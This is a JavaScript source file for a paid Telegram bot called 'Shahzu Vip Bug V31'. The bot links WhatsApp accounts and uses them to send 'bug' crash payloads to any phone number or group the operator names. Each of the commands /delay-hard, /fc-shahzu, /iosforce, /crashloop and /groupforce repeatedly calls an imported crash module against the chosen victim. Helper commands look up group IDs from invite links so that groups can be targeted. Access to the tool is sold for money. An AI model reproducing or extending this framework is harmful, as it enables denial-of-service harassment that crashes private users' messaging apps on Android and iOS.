const TelegramBot = require("node-telegram-bot-api");
const makeWASocket = require("@sakataoffc/baileys").default;
const { useMultiFileAuthState, DisconnectReason } = require("@sakataoffc/baileys");
const pino = require("pino");
const chalk = require("chalk");
const fs = require("fs-extra");
const path = require("path");
const config = require("./config");

let premiumUsers = require("./premium");
const invisiblehard = require("./bugs/invisible");
const { forceandro } = require("./bugs/fc-shahzu");
const iosforce = require("./bugs/iosforce");
const crashloop = require("./bugs/crashloop");
const groupforce = require("./bugs/groupforce");

// ---------- helpers ----------
const botStartTime = Date.now();

function formatUptime(ms) {
    const totalSec = Math.floor(ms / 1000);
    const d = Math.floor(totalSec / 86400);
    const h = Math.floor((totalSec % 86400) / 3600);
    const m = Math.floor((totalSec % 3600) / 60);
    const s = totalSec % 60;
    const parts = [];
    if (d > 0) parts.push(`${d}d`);
    if (h > 0) parts.push(`${h}h`);
    if (m > 0) parts.push(`${m}m`);
    parts.push(`${s}s`);
    return parts.join(" ");
}

function saveArray(file, name, arr) {
    const content = `const ${name} = ${JSON.stringify(arr, null, 4)};\n\nmodule.exports = ${name};\n`;
    fs.writeFileSync(file, content);
}

const isOwner = (id) => Number(id) === Number(config.ownerId);
const isPremium = (id) => premiumUsers.includes(String(id));
const isPrivate = (msg) => msg.chat.type === "private";

const ACCESS_DENIED =
`🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @shahzu_404

💰 Price/Harga:
✅ Access permanent: 24$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`;

const SESSION_INACTIVE =
`❌ session not active

Use /reqpair 92xxxxxxxxxx`;

// ---------- per-user sender registry ----------
const userSockets = new Map(); // Map<telegramUserId, Map<waNumber, sock>>

function getUserSenders(userId) {
    return userSockets.get(String(userId)) || new Map();
}

function addUserSender(userId, waNumber, sock) {
    const key = String(userId);
    if (!userSockets.has(key)) userSockets.set(key, new Map());
    userSockets.get(key).set(waNumber, sock);
}

function removeUserSender(userId, waNumber) {
    const key = String(userId);
    const map = userSockets.get(key);
    if (map) {
        map.delete(waNumber);
        if (map.size === 0) userSockets.delete(key);
    }
}

// ---------- telegram bot ----------
const bot = new TelegramBot(config.botToken, { polling: true });

// ---------- WA connect for a user ----------
async function connectUserWA(userId, number, chatId) {
    const userSessionDir = path.join(config.sessionsDir, String(userId), number);
    fs.ensureDirSync(userSessionDir);

    const { state, saveCreds } = await useMultiFileAuthState(userSessionDir);

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Shahzu Vip Bug V31", "Chrome", "1.0.0"]
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "connecting") {
            if (!fs.existsSync(path.join(userSessionDir, "creds.json"))) {
                try {
                    const code = await sock.requestPairingCode(number, config.pairingCode);
                    const formatted = code.match(/.{1,4}/g)?.join("-") || code;
                    await bot.sendMessage(chatId,
`╭━━━〔 *PAIRING CODE* 〕━━━╮
┃
┃ Number : ${number}
┃ Code   : ${formatted}
┃
┃ Enter this code in WhatsApp:
┃ Settings → Linked Devices →
┃ Link with phone number
┃
╰━━━━━━━━━━━━━━━━━━━━╯

© Shahzu Vip Bug V31`,
                        { parse_mode: "Markdown" }
                    );
                } catch (err) {
                    console.log("pairing error:", err.message);
                    await bot.sendMessage(chatId, `❌ Failed to get pairing code: ${err.message}`);
                }
            }
        }

        if (connection === "open") {
            const existing = getUserSenders(userId);
            const otherNumbers = [...existing.keys()].filter(n => n !== number);
            if (otherNumbers.length > 0) {
                await bot.sendMessage(chatId, `⚠️ Duplicate session detected — logging out ${number}.`);
                try { await sock.logout(); } catch {}
                removeUserSender(userId, number);
                fs.removeSync(userSessionDir);
                return;
            }

            addUserSender(userId, number, sock);
            console.log(chalk.green(`[WA] user=${userId} number=${number} connected`));
            await bot.sendMessage(chatId, `✅ ${number} connected.`);
        }

        if (connection === "close") {
            const code = lastDisconnect?.error?.output?.statusCode;
            if (code !== DisconnectReason.loggedOut) {
                console.log(chalk.yellow(`[WA] reconnecting user=${userId} number=${number}...`));
                setTimeout(() => connectUserWA(userId, number, chatId), 3000);
            } else {
                removeUserSender(userId, number);
                fs.removeSync(userSessionDir);
                await bot.sendMessage(chatId, `❌ ${number} logged out. Session deleted.`);
            }
        }
    });

    return sock;
}

// ---------- auto-reconnect existing sessions ----------
async function loadAllSessions() {
    if (!fs.existsSync(config.sessionsDir)) return;

    for (const userId of fs.readdirSync(config.sessionsDir)) {
        const userDir = path.join(config.sessionsDir, userId);
        if (!fs.statSync(userDir).isDirectory()) continue;

        for (const number of fs.readdirSync(userDir)) {
            const sessionDir = path.join(userDir, number);
            if (!fs.existsSync(path.join(sessionDir, "creds.json"))) continue;

            try {
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
                const sock = makeWASocket({
                    auth: state,
                    printQRInTerminal: false,
                    logger: pino({ level: "silent" }),
                    browser: ["Shahzu Vip Bug V31", "Chrome", "1.0.0"]
                });
                sock.ev.on("creds.update", saveCreds);
                sock.ev.on("connection.update", ({ connection }) => {
                    if (connection === "open") {
                        addUserSender(userId, number, sock);
                        console.log(chalk.green(`[WA] loaded user=${userId} number=${number}`));
                    }
                    if (connection === "close") {
                        setTimeout(() => loadAllSessions(), 5000);
                    }
                });
            } catch (err) {
                console.log(`[WA] load failed for ${number}:`, err.message);
            }
        }
    }
}

// ---------- membership check ----------
async function isMember(userId, chatId) {
    try {
        const member = await bot.getChatMember(chatId, userId);
        return ["creator", "administrator", "member"].includes(member.status);
    } catch {
        return false;
    }
}

async function checkBothJoined(userId) {
    const inChannel = await isMember(userId, config.channelId);
    const inGroup = await isMember(userId, config.groupId);
    return { inChannel, inGroup, allJoined: inChannel && inGroup };
}

async function sendMustJoin(chatId) {
    return bot.sendPhoto(chatId, config.photoUrl, {
        caption:
`📢 *Must join* 

Join both the channel and group
to use this bot.`,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📢 Channel", url: config.channelUrl },
                    { text: "👥 Group", url: config.groupUrl }
                ],
                [
                    { text: "✅ Check membership", callback_data: "check_membership" }
                ]
            ]
        }
    });
}

// ---------- main menu ----------
async function sendMainMenu(chatId, userId) {
    let username = "Unknown";
    try {
        const chat = await bot.getChat(userId);
        username = chat.username ? `@${chat.username}` : (chat.first_name || "Unknown");
    } catch {}

    let status = "free user";
    if (isOwner(userId)) status = "owner";
    else if (isPremium(userId)) status = "premium user";

    const uptime = formatUptime(Date.now() - botStartTime);

    const caption =
`┌─────┤ Shahzu Vip Bug V31 ├─────┐
│➻ Name: ${username}
│➻ Developer: @shahzu_404
│➻ Status: ${status}
│➻ Online: ${uptime}
└───────────────────┘
┌─────┤ Bug Android ├─────┐
│➻ delay-hard num
│➻ fc-shahzu num
└───────────────────┘
┌─────┤ Bug iOS ├─────┐
│➻ iosforce num
│➻ crashloop num
└───────────────────┘
┌─────┤ Bug Group ├─────┐
│➻ groupforce groupid
│➻ listgc
│➻ groupid link
└───────────────────┘`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📢 Channel", url: config.channelUrl },
                    { text: "👥 Group", url: config.groupUrl }
                ]
            ]
        }
    });
}

// ---------- /start ----------
bot.onText(/\/start/, async (msg) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (isOwner(userId)) return sendMainMenu(chatId, userId);

    const { allJoined } = await checkBothJoined(userId);
    if (!allJoined) return sendMustJoin(chatId);

    return sendMainMenu(chatId, userId);
});

bot.onText(/\/menu/, async (msg) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (isOwner(userId)) return sendMainMenu(chatId, userId);
    const { allJoined } = await checkBothJoined(userId);
    if (!allJoined) return sendMustJoin(chatId);
    return sendMainMenu(chatId, userId);
});

// ---------- callback query ----------
bot.on("callback_query", async (q) => {
    const chatId = q.message.chat.id;
    const userId = q.from.id;
    const data = q.data;

    await bot.answerCallbackQuery(q.id);

    if (data === "check_membership") {
        if (isOwner(userId)) {
            await bot.deleteMessage(chatId, q.message.message_id).catch(() => {});
            return sendMainMenu(chatId, userId);
        }
        const { inChannel, inGroup, allJoined } = await checkBothJoined(userId);
        if (allJoined) {
            await bot.deleteMessage(chatId, q.message.message_id).catch(() => {});
            return sendMainMenu(chatId, userId);
        }
        const missing = [];
        if (!inChannel) missing.push("📢 Channel");
        if (!inGroup) missing.push("👥 Group");
        return bot.answerCallbackQuery(q.id, {
            text: `❌ You haven't joined: ${missing.join(", ")}`,
            show_alert: true
        });
    }

    if (data === "xflow_menu") {
        return bot.sendMessage(chatId,
`╭━━━〔 *BUG MENU* 〕━━━╮
┃
┣━ Bug Android
┃➻ /delay-hard 92xxxxxxxx
┃➻ /fc-shahzu 92xxxxxxxx
┃
┣━ Bug iOS
┃➻ /iosforce 92xxxxxxxx
┃➻ /crashloop 92xxxxxxxx
┃
┣━ Bug Group
┃➻ /groupforce <groupid>
┃➻ /listgc
┃➻ /groupid <link>
┃
╰━━━━━━━━━━━━━━━━━━━━╯

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    if (data === "misc_menu") {
        return bot.sendMessage(chatId,
`┌───┤ Misc Menu ├───────┐
│➻ reqpair <number>
│➻ delpair <number>
│➻ addprem <ID>
│➻ delprem <ID>
└─────────────────────┘

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }
});

// ---------- /reqpair ----------
bot.onText(/\/reqpair(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number || number.length < 8 || number.length > 15) {
        return bot.sendMessage(chatId,
`Usage:
/reqpair 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const senders = getUserSenders(userId);
    if (senders.size >= 1) {
        const existing = [...senders.keys()][0];
        return bot.sendMessage(chatId,
`❌ You already have a paired number: ${existing}

Delete it first to pair a new one.
Usage:
/delpair ${existing}

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    if (senders.has(number)) {
        return bot.sendMessage(chatId, `ℹ️ ${number} already paired.`);
    }

    try {
        await bot.sendMessage(chatId, `⏳ Requesting pairing code for ${number}...`);
        await connectUserWA(userId, number, chatId);
    } catch (err) {
        console.log("reqpair error:", err.message);
        await bot.sendMessage(chatId, `❌ Failed: ${err.message}`);
    }
});

// ---------- /delpair ----------
bot.onText(/\/delpair(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number) {
        return bot.sendMessage(chatId,
`Usage:
/delpair 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const map = getUserSenders(userId);
    const sock = map.get(number);

    if (!sock) {
        return bot.sendMessage(chatId, `❌ ${number} not paired.`);
    }

    try {
        try { await sock.logout(); } catch {}
        try { sock.ws.close(); } catch {}
        removeUserSender(userId, number);
        fs.removeSync(path.join(config.sessionsDir, String(userId), number));
        await bot.sendMessage(chatId, `✅ ${number} removed.`);
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Failed: ${err.message}`);
    }
});

// ---------- /addprem ----------
bot.onText(/\/addprem(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);

    const target = (match[1] || "").trim();
    if (!target) {
        return bot.sendMessage(chatId,
`Usage:
/addprem <ID>

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    if (premiumUsers.includes(target)) {
        return bot.sendMessage(chatId, `ℹ️ ${target} already premium.`);
    }

    premiumUsers.push(target);
    saveArray(config.premiumFile, "premiumUsers", premiumUsers);
    await bot.sendMessage(chatId, `✅ ${target} added to premium.`);
});

// ---------- /delprem ----------
bot.onText(/\/delprem(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);

    const target = (match[1] || "").trim();
    if (!target) {
        return bot.sendMessage(chatId,
`Usage:
/delprem <ID>

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const idx = premiumUsers.indexOf(target);
    if (idx === -1) return bot.sendMessage(chatId, `❌ ${target} not found.`);

    premiumUsers.splice(idx, 1);
    saveArray(config.premiumFile, "premiumUsers", premiumUsers);
    await bot.sendMessage(chatId, `✅ ${target} removed from premium.`);
});

// ---------- helper: get active senders or notify ----------
function getActiveSenders(userId) {
    const senders = getUserSenders(userId);
    return [...senders.values()].filter(s => s && s.user);
}

// ---------- /delay-hard ----------
bot.onText(/\/delay-hard(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number || number.length < 8 || number.length > 15) {
        return bot.sendMessage(chatId,
`Usage:
/delay-hard 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const target = number + "@s.whatsapp.net";
    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");

    for (const sock of active) {
        for (let i = 0; i < 30; i++) {
            try {
                await invisiblehard(sock, target);
                await invisiblehard(sock, target);
                await invisiblehard(sock, target);
                await invisiblehard(sock, target);
            } catch {}
        }
    }

    const notification =
`┌──────┤ *NOTIFICATION* ├──────┐
│ Sent bug to 👇🏻
│ Target: ${number}
│ From: ${senderList}
└────────────────────────┘

© Shahzu Vip Bug V31`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: notification,
        parse_mode: "Markdown"
    });
});

// ---------- /fc-shahzu ----------
bot.onText(/\/fc-shahzu(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number || number.length < 8 || number.length > 15) {
        return bot.sendMessage(chatId,
`Usage:
/fc-shahzu 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const target = number + "@s.whatsapp.net";
    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");

    for (const sock of active) {
        for (let i = 0; i < 30; i++) {
            try {
                await forceandro(sock, target);
                await forceandro(sock, target);
                await forceandro(sock, target);
                await forceandro(sock, target);
            } catch {}
        }
    }

    const notification =
`┌──────┤ *NOTIFICATION* ├──────┐
│ Sent bug to 👇🏻
│ Target: ${number}
│ From: ${senderList}
└────────────────────────┘

© Shahzu Vip Bug V31`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: notification,
        parse_mode: "Markdown"
    });
});

// ---------- /iosforce ----------
bot.onText(/\/iosforce(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number || number.length < 8 || number.length > 15) {
        return bot.sendMessage(chatId,
`Usage:
/iosforce 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const target = number + "@s.whatsapp.net";
    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");

    for (const sock of active) {
        for (let i = 0; i < 30; i++) {
            try {
                await iosforce(sock, target);
                await iosforce(sock, target);
                await iosforce(sock, target);
                await iosforce(sock, target);
            } catch {}
        }
    }

    const notification =
`┌──────┤ *NOTIFICATION* ├──────┐
│ Sent bug to 👇🏻
│ Target: ${number}
│ From: ${senderList}
└────────────────────────┘

© Shahzu Vip Bug V31`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: notification,
        parse_mode: "Markdown"
    });
});

// ---------- /crashloop ----------
bot.onText(/\/crashloop(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const number = (match[1] || "").replace(/[^0-9]/g, "");

    if (!number || number.length < 8 || number.length > 15) {
        return bot.sendMessage(chatId,
`Usage:
/crashloop 92xxxxxxxx

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const target = number + "@s.whatsapp.net";
    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");

    for (const sock of active) {
        for (let i = 0; i < 5; i++) {
            try { await crashloop(sock, target); } catch {}
        }
    }

    const notification =
`┌──────┤ *NOTIFICATION* ├──────┐
│ Sent bug to 👇🏻
│ Target: ${number}
│ From: ${senderList}
└────────────────────────┘

© Shahzu Vip Bug V31`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: notification,
        parse_mode: "Markdown"
    });
});

// ---------- /groupid ----------
bot.onText(/\/groupid(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const invite = (match[1] || "").trim();

    if (!invite || !invite.includes("chat.whatsapp.com/")) {
        return bot.sendMessage(chatId,
`Usage:
/groupid <invite_link>

Example:
/groupid https://chat.whatsapp.com/XXXXX

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const code = invite.split("chat.whatsapp.com/").pop().split("?")[0].trim();
    const sock = active[0];

    let groupJid;
    try {
        const info = await sock.groupGetInviteInfo(code);
        groupJid = info.id;
    } catch (err) {
        return bot.sendMessage(chatId, `❌ Failed to fetch group info: ${err.message}`);
    }

    await bot.sendMessage(chatId,
`┌───┤ *GROUP ID* ├───┐
│
│ ➻ Group: ${groupJid}
│ ➻ Invite: ${code}
│
│ Now use:
│ /groupforce ${groupJid}
│
└───────────────────┘

© Shahzu Vip Bug V31`,
        { parse_mode: "Markdown" }
    );
});

// ---------- /listgc ----------
bot.onText(/\/listgc/, async (msg) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    const sock = active[0];

    let groups;
    try {
        groups = await sock.groupFetchAllParticipating();
    } catch (err) {
        return bot.sendMessage(chatId, `❌ Failed: ${err.message}`);
    }

    const groupList = Object.values(groups);

    if (groupList.length === 0) {
        return bot.sendMessage(chatId, "ℹ️ No groups found on this sender.");
    }

    const senderNumber = sock.user.id.split(":")[0].split("@")[0];

    let text = `┌───┤ *GROUP LIST* ├───┐\n`;
    text += `│ From: ${senderNumber}\n`;
    text += `│ Total: ${groupList.length}\n`;
    text += `└────────────────────┘\n\n`;

    groupList.forEach((g, i) => {
        const name = g.subject || "Unnamed";
        const jid = g.id;
        const members = g.participants?.length || 0;

        text += `*${i + 1}.* ${name}\n`;
        text += `   └ ${jid}\n`;
        text += `   └ 👥 ${members} members\n\n`;
    });

    text += `© Shahzu Vip Bug V31`;

    const MAX = 4000;
    if (text.length <= MAX) {
        await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
    } else {
        const chunks = [];
        let current = "";
        for (const line of text.split("\n")) {
            if ((current + line + "\n").length > MAX) {
                chunks.push(current);
                current = "";
            }
            current += line + "\n";
        }
        if (current) chunks.push(current);

        for (const chunk of chunks) {
            await bot.sendMessage(chatId, chunk, { parse_mode: "Markdown" });
        }
    }
});

// ---------- /groupforce ----------
bot.onText(/\/groupforce(?:\s+(.+))?/, async (msg, match) => {
    if (!isPrivate(msg)) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId) && !isPremium(userId)) {
        return bot.sendMessage(chatId, ACCESS_DENIED);
    }

    if (!isOwner(userId)) {
        const { allJoined } = await checkBothJoined(userId);
        if (!allJoined) return sendMustJoin(chatId);
    }

    const groupJid = (match[1] || "").trim();

    if (!groupJid || !groupJid.endsWith("@g.us")) {
        return bot.sendMessage(chatId,
`Usage:
/groupforce <group_id>

Example:
/groupforce 123456789012345678@g.us

Get group ID first:
/groupid <invite_link>

© Shahzu Vip Bug V31`,
            { parse_mode: "Markdown" }
        );
    }

    const active = getActiveSenders(userId);
    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);

    let totalParticipants = 0;

    for (const sock of active) {
        try {
            const meta = await sock.groupMetadata(groupJid);
            totalParticipants = meta.participants.length;

            for (let i = 0; i < 5; i++) {
                try { await groupforce(sock, groupJid); } catch (err) {
                    console.log("groupforce cycle err:", err.message);
                }
            }
        } catch (err) {
            await bot.sendMessage(chatId, `❌ Cannot access group: ${err.message}`);
            continue;
        }
    }

    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");

    const notification =
`┌──────┤ *NOTIFICATION* ├──────┐
│ Sent bug to 👇🏻
│ Group: ${groupJid}
│ Members: ${totalParticipants}
│ From: ${senderList}
└────────────────────────┘

© Shahzu Vip Bug V31`;

    await bot.sendPhoto(chatId, config.photoUrl, {
        caption: notification,
        parse_mode: "Markdown"
    });
});

// ---------- boot ----------
(async () => {
    console.log(chalk.cyan(`
╔═══════════════════════════╗
║   Shahzu Vip Bug V31      ║
║   BOT TELAH AKTIF         ║
╚═══════════════════════════╝
`));
    fs.ensureDirSync(config.sessionsDir);
    await loadAllSessions();
})();

process.on("unhandledRejection", (e) => console.log("unhandled:", e));
